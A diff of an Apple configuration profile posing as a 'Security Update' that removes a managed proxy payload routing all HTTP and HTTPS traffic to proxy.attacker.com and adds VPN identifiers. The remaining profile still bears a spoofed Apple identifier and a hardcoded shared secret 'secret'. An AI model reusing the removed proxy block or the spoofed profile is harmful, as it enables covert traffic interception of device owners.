@@ -10,7 +10,7 @@
             <key>PayloadVersion</key>
             <integer>1</integer>
             <key>PayloadIdentifier</key>
-            <string>com.security.vpn</string>
+            <string>com.security.vpn.00000000-0000-0000-0000-000000000001</string>
             <key>PayloadUUID</key>
             <string>00000000-0000-0000-0000-000000000001</string>
             <key>PayloadDisplayName</key>
@@ -25,37 +25,27 @@
             <string>SharedSecret</string>
             <key>SharedSecret</key>
             <string>secret</string>
-        </dict>
-        <dict>
-            <key>PayloadType</key>
-            <string>com.apple.proxy.managed</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>PayloadIdentifier</key>
-            <string>com.security.proxy</string>
-            <key>PayloadUUID</key>
-            <string>00000000-0000-0000-0000-000000000002</string>
-            <key>PayloadDisplayName</key>
-            <string>Proxy</string>
-            <key>HTTPProxy</key>
-            <string>proxy.attacker.com</string>
-            <key>HTTPPort</key>
-            <integer>8080</integer>
-            <key>HTTPSProxy</key>
-            <string>proxy.attacker.com</string>
-            <key>HTTPSPort</key>
-            <integer>8080</integer>
+            <key>LocalIdentifier</key>
+            <string>user</string>
+            <key>RemoteIdentifier</key>
+            <string>server</string>
+            <key>OnDemandEnabled</key>
+            <integer>0</integer>
+            <key>OnDemandRules</key>
+            <array/>
         </dict>
     </array>
     <key>PayloadDisplayName</key>
     <string>Security Update</string>
     <key>PayloadIdentifier</key>
-    <string>com.apple.security.update</string>
+    <string>com.apple.security.update.00000000-0000-0000-0000-000000000003</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
     <string>00000000-0000-0000-0000-000000000003</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
 </dict>
 </plist>
